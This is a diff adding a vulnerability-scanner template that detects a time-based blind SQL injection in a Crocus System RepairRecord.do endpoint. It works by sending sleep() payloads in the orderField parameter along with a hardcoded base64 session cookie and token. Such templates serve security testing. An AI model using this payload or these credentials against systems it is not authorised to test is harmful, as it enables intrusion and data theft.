@@ -1,0 +1,58 @@
+id: poc-yaml-crocus-repairrecord-sqli
+info:
+  name: Crocus System RepairRecord.do SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3) + 2}}'
+http:
+  - raw:
+      - |
+        POST /RepairRecord.do?Action=QueryLast HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;
+        Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
+        Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
+
+        EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep({{t1}}))a)&orderType=asc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"Code":200'
+          - '"Result":'
+          - '"Count":0'
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t1)'
+          - 'duration <= to_number(t2)'
+  - raw:
+      - |
+        POST /RepairRecord.do?Action=QueryLast HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;
+        Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDYzNjk0MjEwNC44ODQ1MTQmUklEPTEmTT1CTWFwJklOUz0x
+        Token: c3RyZWFtYXgyMDAyMDgxODoxNzI0NjM2OTQyMTA0Ljg4NDU=
+
+        EndTime=2024-08-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2024-08-26+00%3A00%3A00&orderField=(select*from(select%0asleep({{t3}}))a)&orderType=asc
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"Code":200'
+          - '"Result":'
+          - '"Count":0'
+      - type: dsl
+        dsl:
+          - 'duration >= to_number(t3)'
+          - 'duration <= to_number(t4)'
